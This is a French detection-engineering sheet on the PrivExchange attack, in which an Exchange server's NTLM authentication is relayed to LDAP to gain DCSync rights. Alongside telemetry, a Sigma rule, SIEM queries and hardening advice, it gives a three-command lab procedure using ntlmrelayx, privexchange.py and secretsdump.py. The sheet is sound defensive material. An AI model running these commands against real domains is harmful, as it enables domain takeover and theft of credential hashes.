# 22 — PrivExchange

| Champ | Valeur |
|-------|--------|
| **Tactique MITRE** | Privilege Escalation |
| **Technique MITRE** | T1068, T1557.001 |
| **Phase kill chain** | Privilege Escalation |
| **CVE** | CVE-2019-0724 / CVE-2018-8581 |
| **Privilèges requis** | Un compte de boîte mail (utilisateur standard) |
| **Impact** | Critique (DA via droits Exchange excessifs) |

---

## 1. Description

Historiquement, **Exchange** dispose de droits **`WriteDacl`** sur l'objet domaine (groupe `Exchange Windows Permissions`). La fonctionnalité **EWS PushSubscription** peut être forcée à faire **authentifier le serveur Exchange (compte machine, privilégié)** vers l'attaquant. En **relayant** cette authentification vers LDAP, l'attaquant écrit une ACL lui octroyant des droits **DCSync** → compromission du domaine. C'est une chaîne coercion + relais (voir fiche 17) exploitant une mauvaise config Exchange.

## 2. Prérequis
- Un compte avec boîte mail Exchange.
- Serveur Exchange non patché avec droits par défaut excessifs.
- Position pour relayer vers LDAP (pas de signing/EPA).

## 3. Procédure de simulation (lab)

```bash
# 1. Relais Exchange → LDAP, octroi de DCSync à l'attaquant
ntlmrelayx.py -t ldap://dc01 --escalate-user attacker

# 2. Forcer Exchange à s'authentifier (EWS push notification)
python privexchange.py -ah 10.0.0.50 exchange.domaine.local -u user -p pass -d domaine.local

# 3. DCSync avec les droits obtenus
secretsdump.py -just-dc domaine.local/attacker:pass@dc01
```

## 4. Télémétrie générée (logs)

| Source | Event ID | Signification |
|--------|----------|---------------|
| Security (DC) | 4624 | Logon NTLM du **compte machine Exchange** depuis IP de l'attaquant |
| Security (DC) | **5136** | Modification de la **DACL de l'objet domaine** (ajout de droits) |
| Security (DC) | 4662 | DCSync consécutif |

**Anomalie clé :** modification de la DACL du domaine + compte machine Exchange authentifié depuis une IP anormale.

## 5. Détection

### Règle Sigma
```yaml
title: PrivExchange - Domain Object DACL Modified via Relay
status: experimental
logsource:
    product: windows
    service: security
detection:
    dacl:
        EventID: 5136
        ObjectClass: 'domainDNS'
        AttributeLDAPDisplayName: 'nTSecurityDescriptor'
    condition: dacl
level: critical
```

### Traduction SIEM
- **Elastic :** `event.code:5136 and winlog.event_data.AttributeLDAPDisplayName:"nTSecurityDescriptor"` sur l'objet domaine.
- **QRadar :** corréler logon NTLM du compte Exchange depuis IP inhabituelle + 5136 + 4662.

## 6. Contre-mesures / Hardening
- Patch Exchange (KB CVE-2019-0724) ; réduire les droits `Exchange Windows Permissions`.
- LDAP signing + channel binding.
- Retirer `WriteDacl` d'Exchange sur l'objet domaine.

## 7. Features pour l'agent IA
- Modification de la DACL de l'objet domaine (événement rarissime → alerte forte).
- Authentification d'un compte machine de service depuis une IP hors baseline.
- Séquence coercion → relais → DCSync.

## 8. Références
- https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/
- https://github.com/dirkjanm/PrivExchange
